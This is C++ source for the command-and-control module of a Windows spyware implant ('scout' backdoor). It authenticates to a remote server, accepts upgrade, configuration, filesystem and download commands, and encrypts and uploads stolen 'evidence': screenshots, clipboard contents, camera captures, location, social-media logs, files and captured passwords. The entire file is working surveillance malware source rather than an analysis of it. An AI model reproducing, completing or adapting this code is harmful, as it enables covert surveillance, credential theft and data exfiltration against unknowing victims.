#include <windows.h>
#include <Sddl.h>

#include "binpatch.h"
#include "globals.h"
#include "zmem.h"
#include "base64.h"
#include "utils.h"
#include "crypt.h"
#include "sha1.h"
#include "base64.h"
#include "winhttp.h"
#include "proto.h"
#include "debug.h"
#include "main.h"
#include "device.h"
#include "screenshot.h"
#include "crypt.h"
#include "upgrade.h"
#include "social.h"
#include "conf.h"
#include "position.h"
#include "clipboard.h"
#include "password.h"
#include "filesystem.h"
#include "conf.h"

#pragma include_alias( "dxtrans.h", "camera.h" )
#define __IDxtCompositor_INTERFACE_DEFINED__
#define __IDxtAlphaSetter_INTERFACE_DEFINED__
#define __IDxtJpeg_INTERFACE_DEFINED__
#define __IDxtKey_INTERFACE_DEFINED__
#include "camera.h"

extern PDEVICE_CONTAINER lpDeviceContainer;

BYTE pCurrentRandomData[16];

BOOL ProtoAuth()
{
	BOOL bRet = FALSE;
	LPSTR lpAuthCmd = ProtoMessageAuth();

	BOOL bSend = WinHTTPSendData((LPBYTE)lpAuthCmd, strlen(lpAuthCmd));
	zfree(lpAuthCmd);

	if (!bSend)
	{
#ifdef _DEBUG
		OutputDebug(L"[!!] WinHTTPSendData FAIL @ proto.cpp\n");
		__asm int 3;
#endif	
		return FALSE;
	}

	LPBYTE lpBuffer;
	DWORD dwOut;
	LPPROTO_RESPONSE_AUTH lpProtoResponse = (LPPROTO_RESPONSE_AUTH) GetResponse(TRUE, &dwOut); 
	if (!lpProtoResponse || dwOut < sizeof(PROTO_RESPONSE_AUTH))
	{
#ifdef _DEBUG
		OutputDebug(L"[!!] GetResponse fail @ %s:%d\n", __FILEW__, __LINE__);
		__asm int 3;
#endif

		zfree(lpProtoResponse);
		return FALSE;
	}

	if (VerifyMessage(lpProtoResponse->pRandomData, lpProtoResponse->pSha1Digest))
	{
		switch (lpProtoResponse->uProtoCommand) 
		{
		case PROTO_UNINSTALL:
			if (WinHTTPSendData(lpBuffer, CommandHash(PROTO_BYE, NULL, 0, pSessionKey, &lpBuffer)))
				zfree(lpBuffer);
			Uninstall();
			//__asm int 3; // not reached
		case PROTO_NO:
			bRet = FALSE;
			break;
		case PROTO_OK:
			bRet = TRUE;
			break;
		default:
			bRet = FALSE;
#ifdef _DEBUG
			OutputDebug(L"[!!] Got unknown response, uProtoCommand: %08x\n", lpProtoResponse->uProtoCommand);
			__asm int 3;
#endif
		}
	}
#ifdef _DEBUG
	else
	{
		OutputDebug(L"[!!] Cannot verify message integrity :((\n");
		__asm int 3; // FIXME 
	};
#endif

	zfree(lpProtoResponse);
	return bRet;
}

BOOL ProtoId()
{
	BOOL bSend;
	DWORD dwBuffLen;
	LPBYTE lpBuffer, lpCryptedBuffer;
	
	lpBuffer = ProtoMessageId(&dwBuffLen);
	bSend = WinHTTPSendData(lpCryptedBuffer, CommandHash(PROTO_ID, lpBuffer, dwBuffLen, pSessionKey, &lpCryptedBuffer));
	zfree(lpCryptedBuffer);
	zfree(lpBuffer);

	if (!bSend)
	{
#ifdef _DEBUG
		OutputDebug(L"[!!] WinHTTPSendData FAIL @ proto.cpp\n");
		__asm int 3;
#endif
		return FALSE;
	}
	
	DWORD dwOut;
	LPPROTO_RESPONSE_ID lpProtoResponse = (LPPROTO_RESPONSE_ID)GetResponse(FALSE, &dwOut);
	if (!lpProtoResponse || dwOut < sizeof(PROTO_RESPONSE_ID))
	{
#ifdef _DEBUG
		OutputDebug(L"[!!] GetResponse fail @ %s:%d\n", __FILEW__, __LINE__);
		__asm int 3;
#endif
		zfree(lpProtoResponse);
		return FALSE;
	}

	if (lpProtoResponse->uProtoCommand != PROTO_OK)
	{
#ifdef _DEBUG
		OutputDebug(L"[!!] Got uProtoCommand != PROTO_OK @ ProtoId()\n");
		__asm int 3;
#endif
		zfree(lpProtoResponse);
		return FALSE;
	}

	// parse availables.
	if (lpProtoResponse->uAvailables)
	{
		LPDWORD lpAvailables = (&lpProtoResponse->uAvailables) + 1;
		for (DWORD i=0; i<lpProtoResponse->uAvailables; i++)
		{
			if (lpAvailables[i] == PROTO_UPGRADE)
			{
				if (WinHTTPSendData(lpCryptedBuffer, CommandHash(PROTO_UPGRADE, NULL, 0, pSessionKey, &lpCryptedBuffer)))
				{
					LPPROTO_RESPONSE_UPGRADE lpProtoUpgrade = (LPPROTO_RESPONSE_UPGRADE)GetResponse(FALSE, &dwOut);
					if (!lpProtoUpgrade || dwOut < sizeof(PROTO_RESPONSE_UPGRADE))
					{
#ifdef _DEBUG
						OutputDebug(L"[!!] GetResponse fail @ %s:%d\n", __FILEW__, __LINE__);
						__asm int 3;
#endif
						zfree(lpProtoUpgrade);
						zfree(lpCryptedBuffer);
						continue;
					}

					if (lpProtoUpgrade) // FIXME check che c'e' abbastanza buffah (upgradenamelen + dwfilesize
					{
						LPWSTR strUpgradeName = (LPWSTR) zalloc(lpProtoUpgrade->uUpgradeNameLen + sizeof(WCHAR));
						memcpy(strUpgradeName, &lpProtoUpgrade->pUpgradeNameBuffer, lpProtoUpgrade->uUpgradeNameLen);

						DWORD dwFileSize = *(LPDWORD) (((PBYTE)&lpProtoUpgrade->pUpgradeNameBuffer) + lpProtoUpgrade->uUpgradeNameLen);
						LPBYTE lpFileBuff = (LPBYTE)(((LPBYTE)&lpProtoUpgrade->pUpgradeNameBuffer) + lpProtoUpgrade->uUpgradeNameLen) + sizeof(ULONG);

						if (strUpgradeName[0] == L's' && strUpgradeName[1] == 'o')
						{
							if (!UpgradeSoldier(strUpgradeName, lpFileBuff, dwFileSize))
							{

							}
						}
						zfree(strUpgradeName);
						zfree(lpProtoUpgrade);
					}
					
				}
				zfree(lpCryptedBuffer);
			}
			else if (lpAvailables[i] == PROTO_NEW_CONF)
			{
				if (WinHTTPSendData(lpCryptedBuffer, CommandHash(PROTO_NEW_CONF, NULL, 0, pSessionKey, &lpCryptedBuffer)))
				{
					LPDWORD lpRespBuffer = (LPDWORD) GetResponse(FALSE, &dwOut);
					if (lpRespBuffer && dwOut >= 12 && lpRespBuffer[0] == PROTO_OK)
					{
						LPBYTE lpConfBuffer = (LPBYTE) (&lpRespBuffer[1]);
						NewConf(lpConfBuffer, TRUE, TRUE);
						StartModules();

						zfree(lpCryptedBuffer);
						DWORD dwOk = 1;
						WinHTTPSendData(lpCryptedBuffer, CommandHash(PROTO_NEW_CONF, (LPBYTE)&dwOk, sizeof(DWORD), pSessionKey, &lpCryptedBuffer));

						LPBYTE lpResp = GetResponse(FALSE, &dwOut);
						zfree(lpResp);
					}
					else
					{
#ifdef _DEBUG
						OutputDebug(L"[!] GOT != PROTO_OK for NEW_CONF, ptr:%x, size:%d", lpBuffer, dwOut); 
						__asm int 3;
#endif
					}

					zfree(lpRespBuffer);
					__asm nop;
				}
				zfree(lpCryptedBuffer);
			}
			else if (lpAvailables[i] == PROTO_FILESYSTEM)
			{
				if (WinHTTPSendData(lpCryptedBuffer, CommandHash(PROTO_FILESYSTEM, NULL, 0, pSessionKey, &lpCryptedBuffer)))
				{
					LPDWORD lpRespBuffer = (LPDWORD) GetResponse(FALSE, &dwOut);
					if (lpRespBuffer && dwOut >= 4 && lpRespBuffer[0] == PROTO_OK)
					{
						DWORD dwMsgLen = lpRespBuffer[1];
						DWORD dwNumDir = lpRespBuffer[2];
						LPBYTE lpDirBuffer = (LPBYTE) &lpRespBuffer[3];

						FileSystemHandler(dwMsgLen, dwNumDir, lpDirBuffer);
					}

					zfree(lpRespBuffer);
				}
				zfree(lpCryptedBuffer);
			}
			else if (lpAvailables[i] == PROTO_DOWNLOAD)
			{
				if (WinHTTPSendData(lpCryptedBuffer, CommandHash(PROTO_DOWNLOAD, NULL, 0, pSessionKey, &lpCryptedBuffer)))
				{
					LPDWORD lpRespBuffer = (LPDWORD) GetResponse(FALSE, &dwOut);
					if (lpRespBuffer && dwOut >= 4 && lpRespBuffer[0] == PROTO_OK)
					{
						DWORD dwMsgLen = lpRespBuffer[1];
						DWORD dwNumFiles = lpRespBuffer[2];
						LPBYTE lpFileBuffer = (LPBYTE) &lpRespBuffer[3];

						DownloadHandler(dwMsgLen, dwNumFiles, lpFileBuffer);
					}

					zfree(lpRespBuffer);
				}

				zfree (lpCryptedBuffer);
			}
		}
	}
	zfree(lpProtoResponse);
	
	return TRUE;
}

LPBYTE PackEncryptEvidence(__in DWORD dwBufferSize, __in LPBYTE lpInBuffer, __in DWORD dwEvType, __in LPBYTE lpAdditionalData, __in DWORD dwAdditionalDataLen, __out LPDWORD dwOut)
{
	DWORD dwAlignedSize = Align(dwBufferSize, 16);
	LPBYTE lpCryptedBuff = (LPBYTE) zalloc(dwAlignedSize);
	memcpy(lpCryptedBuff, lpInBuffer, dwBufferSize);

	Encrypt(lpCryptedBuff, dwAlignedSize, pLogKey, PAD_NOPAD);

	DWORD dwHeaderSize;
	LPBYTE lpLogHeader = CreateLogHeader(dwEvType, lpAdditionalData, dwAdditionalDataLen, &dwHeaderSize);

	DWORD dwTotalRoundedSize = sizeof(DWORD) + dwHeaderSize + sizeof(DWORD) + dwAlignedSize;
	LPBYTE lpBuffer = (LPBYTE) zalloc(dwTotalRoundedSize);
	LPBYTE lpTmpBuff = lpBuffer;

	// total size
	*(LPDWORD)lpTmpBuff = dwTotalRoundedSize;
	lpTmpBuff += sizeof(DWORD);

	// header
	memcpy(lpTmpBuff, lpLogHeader, dwHeaderSize);
	lpTmpBuff += dwHeaderSize;
	zfree(lpLogHeader);

	// payload size (in clear)
	*(LPDWORD)lpTmpBuff = dwBufferSize;
	lpTmpBuff += sizeof(DWORD);

	//payload
	memcpy(lpTmpBuff, lpCryptedBuff, dwAlignedSize);
	zfree(lpCryptedBuff);

	*dwOut = dwTotalRoundedSize;
	return lpBuffer;
}

BOOL SendEvidence(LPBYTE lpBuffer, DWORD dwSize)
{
	BOOL bRet = FALSE;

	LPBYTE lpEncBuff;
	if (WinHTTPSendData(lpEncBuff, CommandHash(PROTO_EVIDENCE, lpBuffer, dwSize, pSessionKey, &lpEncBuff)))
	{
		DWORD dwOut;
		LPBYTE lpRespBuff = GetResponse(FALSE, &dwOut);
		if (dwOut >= sizeof(DWORD) && lpRespBuff && *(LPDWORD)lpRespBuff == PROTO_OK)
			bRet = TRUE;
		
		zfree(lpRespBuff);
	}

	zfree(lpEncBuff);
	return bRet;
}

BOOL ProtoEvidences()
{
	BOOL bRet = FALSE;

	if (lpDeviceContainer)
	{
		DWORD dwEvSize;
		LPBYTE lpEvBuffer = PackEncryptEvidence(lpDeviceContainer->uSize, (LPBYTE)lpDeviceContainer->pDataBuffer, PM_DEVICEINFO, NULL, 0, &dwEvSize);
		LPBYTE lpCryptedBuff;

		if (WinHTTPSendData(lpCryptedBuff, CommandHash(PROTO_EVIDENCE, lpEvBuffer, dwEvSize, pSessionKey, &lpCryptedBuff)))
		{
			DWORD dwOut;
			LPBYTE lpRespBuff = GetResponse(FALSE, &dwOut);
 			if (lpRespBuff && dwOut >= sizeof(DWORD))
			{
				if (*(LPDWORD)lpRespBuff == PROTO_OK)
				{
					zfree(lpDeviceContainer->pDataBuffer);
					zfree(lpDeviceContainer);
					lpDeviceContainer = NULL;

					bRet = TRUE;
				}
				else
				{
#ifdef _DEBUG
					__asm int 3;
#endif
				}

				zfree(lpRespBuff);
			}
		}
		zfree(lpEvBuffer);
		zfree(lpCryptedBuff);
	}
	
	Sleep(100);
	for (DWORD i=0; i<MAX_SCREENSHOT_QUEUE; i++)
	{
		LPBYTE lpEvBuffer = lpScreenshotLogs[i].lpBuffer;
		DWORD dwEvSize = lpScreenshotLogs[i].dwSize;

		if (dwEvSize != 0 && lpEvBuffer != NULL)
		{
			if (SendEvidence(lpEvBuffer, dwEvSize)) // FIXME: free evidence solo se GetResponse == OK
			{
				lpScreenshotLogs[i].lpBuffer = 0;
				lpScreenshotLogs[i].dwSize = 0;
				zfree(lpEvBuffer);
			}
		}
	}

	Sleep(100);
	for (DWORD i=0; i<MAX_SOCIAL_QUEUE; i++)
	{
		LPBYTE lpEvBuffer = lpSocialLogs[i].lpBuffer;
		DWORD dwEvSize = lpSocialLogs[i].dwSize;

		if (dwEvSize != 0 && lpEvBuffer != NULL)
		{
			if (SendEvidence(lpEvBuffer, dwEvSize)) // FIXME: free evidence solo se GetResponse == OK
			{
				lpSocialLogs[i].lpBuffer = 0x0;
				lpSocialLogs[i].dwSize = 0;
				zfree(lpEvBuffer);
			}
		}
	}

	Sleep(100);
	for (DWORD i=0; i<MAX_POSITION_QUEUE; i++)
	{
		LPBYTE lpEvBuffer = lpPositionLogs[i].lpBuffer;
		DWORD dwEvSize = lpPositionLogs[i].dwSize;

		if (dwEvSize != 0 && lpEvBuffer != NULL)
		{
			if (SendEvidence(lpEvBuffer, dwEvSize)) // FIXME: free evidence solo se GetResponse == OK
			{
				 lpPositionLogs[i].lpBuffer = 0;
				 lpPositionLogs[i].dwSize = 0;
				 zfree(lpEvBuffer);
			}
		}
	}

	Sleep(100);
	for (DWORD i=0; i<MAX_CLIPBOARD_QUEUE; i++)
	{
		LPBYTE lpEvBuffer = lpClipboardLogs[i].lpBuffer;
		DWORD dwEvSize = lpClipboardLogs[i].dwSize;

		if (dwEvSize != 0 && lpEvBuffer != NULL)
		{
			if (SendEvidence(lpEvBuffer, dwEvSize)) // FIXME: free evidence solo se GetResponse == OK
			{
				lpClipboardLogs[i].lpBuffer = 0;
				lpClipboardLogs[i].dwSize = 0;
				zfree(lpEvBuffer);
			}
		}		
	}

	Sleep(100);
	for (DWORD i=0; i<MAX_CAMERA_QUEUE; i++)
	{
		LPBYTE lpEvBuffer = lpCameraLogs[i].lpBuffer;
		DWORD dwEvSize = lpCameraLogs[i].dwSize;

		if (dwEvSize != 0 && lpEvBuffer != NULL)
		{
			if (SendEvidence(lpEvBuffer, dwEvSize)) // FIXME: free evidence solo se GetResponse == OK
			{
				lpCameraLogs[i].lpBuffer = 0;
				lpCameraLogs[i].dwSize = 0;
				zfree(lpEvBuffer);
			}
		}		
	}

	Sleep(100);
	for (DWORD i=0; i<MAX_FILESYSTEM_QUEUE; i++)
	{
		// filesystem
		LPBYTE lpEvBuffer = lpFileSystemLogs[i].lpBuffer;
		DWORD dwEvSize = lpFileSystemLogs[i].dwSize;

		if (dwEvSize != 0 && lpEvBuffer != NULL)
		{
			if (SendEvidence(lpEvBuffer, dwEvSize))
			{
				lpFileSystemLogs[i].lpBuffer = 0;
				lpFileSystemLogs[i].dwSize = 0;
				zfree(lpEvBuffer);
			}
		}

		// download
		LPWSTR strFileName = lpDownloadLogs[i].strFileName;
		LPWSTR strDisplayName = lpDownloadLogs[i].strDisplayName;

		if (strFileName && strDisplayName)
		{
			LPBYTE lpHeader = NULL;
			DWORD dwHeaderSize, dwFileSize;
			LPBYTE lpFileBuffer = DownloadGetEvidence(strFileName, strDisplayName, &lpHeader, &dwHeaderSize, &dwFileSize);

			if (lpFileBuffer && dwFileSize && dwHeaderSize)
			{
				DWORD dwEvSize;
				LPBYTE lpEvBuffer = PackEncryptEvidence(dwFileSize, lpFileBuffer, PM_DOWNLOAD, (LPBYTE)lpHeader, dwHeaderSize, &dwEvSize);
				zfree(lpFileBuffer);
				zfree(lpHeader);

				if (lpEvBuffer)
				{
					SendEvidence(lpEvBuffer, dwEvSize);

					lpDownloadLogs[i].strFileName = 0;
					lpDownloadLogs[i].strDisplayName = 0;

					zfree(strFileName);
					zfree(strDisplayName);
					zfree(lpEvBuffer);
				}
			}
			/*
			if (lpEvBuffer)
			{




				SendEvidence(lpEvBuffer, dwEvSize);
				zfree(lpEvBuffer);
			}

			lpDownloadLogs[i].strFileName = 0;
			lpDownloadLogs[i].strDisplayName = 0;

			zfree(strFileName);
			zfree(strDisplayName);
			*/
		}
	}

	if (lpPasswordLogs.dwSize && lpPasswordLogs.lpBuffer)
	{
		LPBYTE lpEvBuffer = lpPasswordLogs.lpBuffer;
		DWORD dwEvSize = lpPasswordLogs.dwSize;

		if (dwEvSize != 0 && lpEvBuffer != NULL)
		{
			if (SendEvidence(lpEvBuffer, dwEvSize)) // FIXME: free evidence solo se GetResponse == OK
			{
				lpPasswordLogs.lpBuffer = 0;
				lpPasswordLogs.dwSize = 0;
				zfree(lpEvBuffer);
			}
		}		
	}

	return bRet;
}

BOOL ProtoBye()
{
	LPBYTE lpCryptedBuff;

	if (!WinHTTPSendData(lpCryptedBuff, CommandHash(PROTO_BYE, NULL, 0, pSessionKey, &lpCryptedBuff)))
	{
#ifdef _DEBUG
		OutputDebug(L"[!!] PROTO_BYE FAIL: %08x\n", GetLastError());
		__asm int 3;
#endif
	}

	zfree(lpCryptedBuff);
	return TRUE;
}

BOOL Synch()
{
	BOOL bRet = FALSE;
	ULONG pServerPort;
	BYTE pServerIp[32];
	CHAR strIp[100];

	if (!GetSyncIp(strIp))
		return FALSE;

	if (!WinHTTPSetup((PBYTE)strIp, pServerIp, sizeof(pServerIp), &pServerPort))
	{
#ifdef _DEBUG
		OutputDebug(L"[!] WinHttpSetup FAIL\n");
		__asm int 3;
#endif
		return bRet;
	}

	if (ProtoAuth())
	{
		if (ProtoId())
		{
			if (ProtoEvidences())
			{
				bRet = TRUE;
			}
		}
		ProtoBye();
	}
				
	
	WinHTTPClose();

	return bRet;
}

LPBYTE ProtoMessageId(LPDWORD dwMsgLen)
{
	DWORD dwUser, dwComputer, dwSource;
	LPWSTR lpUserName = (LPWSTR)zalloc((MAX_FILE_PATH + 1) * sizeof(WCHAR));
	LPWSTR lpComputerName = (LPWSTR)zalloc((MAX_FILE_PATH + 1) * sizeof(WCHAR));

	GetEnvironmentVariable(L"USERNAME", lpUserName, MAX_FILE_PATH * sizeof(WCHAR));  //FIXME: array
	GetEnvironmentVariable(L"COMPUTERNAME", lpComputerName, MAX_FILE_PATH * sizeof(WCHAR));  //FIXME: array

	LPPASCAL_STRING lpUserNamePascal = PascalizeString(lpUserName, &dwUser);
	LPPASCAL_STRING lpComputerNamePascal = PascalizeString(lpComputerName, &dwComputer);
	LPPASCAL_STRING lpSourceId = PascalizeString(L"", &dwSource);

	zfree(lpUserName);
	zfree(lpComputerName);

	DWORD dwOffset = sizeof(DWORD);
	DWORD dwBuffLen = dwUser + dwComputer + dwSource + sizeof(DWORD);
	LPBYTE lpBuffer = (LPBYTE)zalloc(dwBuffLen);

	*(LPDWORD)lpBuffer = SCOUT_VERSION;

	memcpy(lpBuffer + dwOffset, lpUserNamePascal, dwUser);
	dwOffset += dwUser;
	memcpy(lpBuffer + dwOffset, lpComputerNamePascal, dwComputer);
	dwOffset += dwComputer;
	memcpy(lpBuffer + dwOffset, lpSourceId, dwSource);

	zfree(lpUserNamePascal);
	zfree(lpComputerNamePascal);
	zfree(lpSourceId);

	*dwMsgLen = dwBuffLen;
	return lpBuffer;
}

LPSTR ProtoMessageAuth()
{
	BYTE pHashBuffer[20];

	DWORD dwRandomPoolSize = GetRandomInt(128, 1024);
	DWORD dwCryptBufferSize = sizeof(PROTO_COMMAND_AUTH);
	DWORD dwMessageSize = dwCryptBufferSize + dwRandomPoolSize; 

	LPPROTO_COMMAND_AUTH lpProtoCommand = (LPPROTO_COMMAND_AUTH) zalloc(dwMessageSize);
	
	// version
	lpProtoCommand->Version = 0x1;

	// ks
	AppendRandomData(pCurrentRandomData, 16);
	memcpy(lpProtoCommand->Kd, pCurrentRandomData, sizeof(lpProtoCommand->Kd));

	// kd[32] == confkey[16] + ks
	LPBYTE lpKD = (LPBYTE) zalloc(32);
	memcpy(lpKD, pConfKey, 16);
	memcpy(lpKD + 16, pCurrentRandomData, 16);

	// sha1(kd)
	CalculateSHA1(pHashBuffer, lpKD, 32);
	memcpy(lpProtoCommand->Sha1, pHashBuffer, sizeof(lpProtoCommand->Sha1));
	zfree(lpKD);

	// backdoor_id
	memcpy(lpProtoCommand->BdoorID, BACKDOOR_ID, min(sizeof(lpProtoCommand->BdoorID), strlen(BACKDOOR_ID)));
	
	// instance id
	LPBYTE lpInstanceId = GetUserUniqueHash();
	memcpy(lpProtoCommand->InstanceID, lpInstanceId, sizeof(lpProtoCommand->InstanceID));
	zfree(lpInstanceId);

	// sub type => win, scout, release, reserved
	lpProtoCommand->SubType.Arch = 0x0;
	lpProtoCommand->SubType.Demo = 0x0;
	lpProtoCommand->SubType.Stage = 0x2;
	lpProtoCommand->SubType.Flags = 0x0;

	// encrypt + rand + base64 the whole thing
	Encrypt((LPBYTE)lpProtoCommand, dwCryptBufferSize, pServerKey, PAD_NOPAD);
	AppendRandomData(((LPBYTE)lpProtoCommand) + dwCryptBufferSize, dwRandomPoolSize);

	LPSTR lpEncodedMessage = (LPSTR) base64_encode((LPBYTE)lpProtoCommand, dwMessageSize);
	zfree(lpProtoCommand);

	return lpEncodedMessage;
}

LPPASCAL_STRING PascalizeString(__in LPWSTR lpString, __in LPDWORD dwOutLen)
{
	DWORD dwSize = (wcslen(lpString) + 1) * sizeof(WCHAR);
	LPPASCAL_STRING lpBuffer = (LPPASCAL_STRING)zalloc(dwSize + sizeof(DWORD));

	lpBuffer->dwStringLen = dwSize;
	wcscpy_s(lpBuffer->lpStringBuff, dwSize / sizeof(WCHAR), lpString);

	*dwOutLen = dwSize + sizeof(DWORD);
	return lpBuffer;
}

ULONG CommandHash(__in ULONG uProtoCmd, __in LPBYTE pMessage, __in ULONG uMessageLen, __in LPBYTE pEncryptionKey, __out LPBYTE *pOutBuff)
{
	ULONG uOut, uOutClear;
	LPBYTE pBuffer, pOutBuffer;
	BYTE pSha1Digest[20];

	uOutClear = sizeof(ULONG) + uMessageLen + 20;
	uOut = uOutClear;

	if (uOut % 16)
		uOut += 16 - (uOut % 16);
	else
		uOut += 16;
	
	// sha1(PROTO_* + version + message)
	pBuffer = (LPBYTE) zalloc(sizeof(ULONG) + uMessageLen);
	*(PULONG)pBuffer = uProtoCmd;
	if (pMessage)
		memcpy(pBuffer + sizeof(ULONG), pMessage, uMessageLen);
	CalculateSHA1(pSha1Digest, pBuffer, uMessageLen + sizeof(ULONG));

	// clear-text(cmd + message + sha1)
	pOutBuffer = (PBYTE) zalloc(uOut);
	*(PULONG)pOutBuffer = uProtoCmd;
	if (pMessage)
		memcpy(pOutBuffer + sizeof(ULONG), pMessage, uMessageLen);
	memcpy(pOutBuffer + sizeof(ULONG) + uMessageLen, pSha1Digest, 20);

	Encrypt(pOutBuffer, uOutClear, pEncryptionKey, PAD_PKCS5);

	*pOutBuff = pOutBuffer;
	
	zfree(pBuffer);
	return uOut;
}

LPBYTE GetUserUniqueHash()
{
	DWORD dwLen = 0;
	LPSTR pStringSid;
	HANDLE hToken = 0;
	LPBYTE lpUserHash = NULL;
	PTOKEN_USER pTokenOwner = NULL;
		
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY| TOKEN_QUERY_SOURCE, &hToken)) 
	{
		GetTokenInformation(hToken, TokenUser, pTokenOwner, 0, &dwLen);
		if (dwLen)
			pTokenOwner = (PTOKEN_USER) zalloc(dwLen);

		if (pTokenOwner) 
		{
			if (GetTokenInformation(hToken, TokenUser, pTokenOwner, dwLen, &dwLen) &&
				ConvertSidToStringSidA(pTokenOwner->User.Sid, &pStringSid)) 
			{
				lpUserHash = (LPBYTE) zalloc(SHA_DIGEST_LENGTH);
				CalculateSHA1(lpUserHash, (LPBYTE) pStringSid, strlen(pStringSid));
				LocalFree(pStringSid);				
			}
			zfree(pTokenOwner);
		}
		CloseHandle(hToken);
	}
	
	return lpUserHash;
}

LPBYTE DecodeMessage(LPBYTE lpMessage, DWORD dwMessageSize, BOOL bBase64, LPDWORD dwOut)
{
	LPBYTE lpBuffer;
	
	if (bBase64)
		lpBuffer = base64_decode((char*)lpMessage, dwMessageSize, (int *)dwOut);
	else
	{
		*dwOut = dwMessageSize;
		lpBuffer = (LPBYTE)zalloc(dwMessageSize);
		memcpy(lpBuffer, lpMessage, dwMessageSize);
	}
	
	Decrypt(lpBuffer, *dwOut, bBase64 ? pConfKey : pSessionKey);

	return lpBuffer;
}

BOOL VerifyMessage(LPBYTE lpRandNonce, LPBYTE lpHash)
{
	DWORD dwOffset = 0;
	BYTE pHashBuffer[20];
	LPBYTE lpBuffer = (LPBYTE)zalloc(48);

	memcpy(lpBuffer, pConfKey, 16);
	dwOffset += 16;
	memcpy(lpBuffer + dwOffset, lpRandNonce, 16);
	dwOffset += 16;
	memcpy(lpBuffer + dwOffset, pCurrentRandomData, 16);
	dwOffset += 16;

	CalculateSHA1(pHashBuffer, lpBuffer, dwOffset);

	dwOffset = 0;
	memcpy(lpBuffer, pHashBuffer, 20);
	dwOffset += 20;
	memcpy(lpBuffer + dwOffset, lpRandNonce, 16);
	dwOffset += 16;

	CalculateSHA1(pHashBuffer, lpBuffer, dwOffset);

	BOOL bRet;
	if (memcmp(pHashBuffer, lpHash, 20))
		bRet = FALSE;
	else
	{
		CalculateSessionKey(lpRandNonce);
		bRet = TRUE;
	}
		
	zfree(lpBuffer);

	return bRet;
}

VOID CalculateSessionKey(LPBYTE lpRandomNonce)
{
	LPBYTE lpBuffer = (LPBYTE)zalloc(48);

	memcpy(lpBuffer, pConfKey, 16);
	memcpy(lpBuffer + 16, lpRandomNonce, 16);
	memcpy(lpBuffer + 32, pCurrentRandomData, 16);
	CalculateSHA1(pSessionKey, lpBuffer, 48);

	zfree(lpBuffer);
}

LPBYTE GetResponse(BOOL bBase64, LPDWORD dwOut)
{
	DWORD dwResponseLen;
	LPBYTE lpDecodedMsg = NULL;
	LPBYTE lpResponseBuffer = WinHTTPGetResponse(&dwResponseLen);

	if (lpResponseBuffer)
	{
		lpDecodedMsg = DecodeMessage(lpResponseBuffer, dwResponseLen, bBase64, dwOut);
		zfree(lpResponseBuffer);

		return lpDecodedMsg;
	}
#ifdef _DEBUG
	else
	{
		OutputDebug(L"[!!] GetResponse cannot get response from server\n");
		__asm int 3;
	}
#endif

	return lpDecodedMsg;
}

PBYTE CreateLogHeader(__in ULONG uEvidenceType, __in PBYTE pAdditionalData, __in ULONG uAdditionalDataLen, __out PULONG uOutLen)
{
	WCHAR wUserName[256];
	WCHAR wHostName[256];
	FILETIME uFileTime;
	LOG_HEADER pLogHeader;
	PLOG_HEADER pFinalLogHeader;

	if (uOutLen)
		*uOutLen = 0;

	memset(wUserName, 0x0, sizeof(wUserName));
	memset(wHostName, 0x0, sizeof(wHostName));
	wUserName[0]=L'-';
	wHostName[0]=L'-'; 
	GetEnvironmentVariable(L"USERNAME", (LPWSTR)wUserName, (sizeof(wUserName)/sizeof(WCHAR))-2);  //FIXME: array
	GetEnvironmentVariable(L"COMPUTERNAME", (LPWSTR)wHostName, (sizeof(wHostName)/sizeof(WCHAR))-2);  //FIXME: array
	GetSystemTimeAsFileTime(&uFileTime);

	pLogHeader.uDeviceIdLen = wcslen(wHostName) * sizeof(WCHAR);
	pLogHeader.uUserIdLen = wcslen(wUserName) * sizeof(WCHAR);
	pLogHeader.uSourceIdLen = 0;
	if (pAdditionalData)
		pLogHeader.uAdditionalData = uAdditionalDataLen;
	else
		pLogHeader.uAdditionalData = 0;
	pLogHeader.uVersion = LOG_VERSION;
	pLogHeader.uHTimestamp = uFileTime.dwHighDateTime;
	pLogHeader.uLTimestamp = uFileTime.dwLowDateTime;
	pLogHeader.uLogType = uEvidenceType;

	// calcola lunghezza paddata
	ULONG uHeaderLen = sizeof(LOG_HEADER) + pLogHeader.uDeviceIdLen + pLogHeader.uUserIdLen + pLogHeader.uSourceIdLen + pLogHeader.uAdditionalData;
	ULONG uPaddedHeaderLen = uHeaderLen;
	if (uPaddedHeaderLen % BLOCK_LEN)
		while(uPaddedHeaderLen % BLOCK_LEN)
			uPaddedHeaderLen++;

	pFinalLogHeader = (PLOG_HEADER) zalloc(uPaddedHeaderLen + sizeof(ULONG));
	PBYTE pTempPtr = (PBYTE)pFinalLogHeader;

	// log size
	*(PULONG)pTempPtr = uPaddedHeaderLen;
	pTempPtr += sizeof(ULONG);

	// header
	memcpy(pTempPtr, &pLogHeader, sizeof(LOG_HEADER));
	pTempPtr += sizeof(LOG_HEADER);

	// hostname
	memcpy(pTempPtr, wHostName, pLogHeader.uDeviceIdLen);
	pTempPtr += pLogHeader.uDeviceIdLen;

	// username
	memcpy(pTempPtr, wUserName, pLogHeader.uUserIdLen);
	pTempPtr += pLogHeader.uUserIdLen;

	// additional data
	if (pAdditionalData)
		memcpy(pTempPtr, pAdditionalData, uAdditionalDataLen);

	// cifra l'header a parte la prima dword che e' in chiaro
	pTempPtr = (PBYTE)pFinalLogHeader;
	pTempPtr += sizeof(ULONG);

	Encrypt(pTempPtr, uHeaderLen, pLogKey, PAD_NOPAD);

	if (uOutLen)
		*uOutLen = uPaddedHeaderLen + sizeof(ULONG);

	return (PBYTE)pFinalLogHeader;
}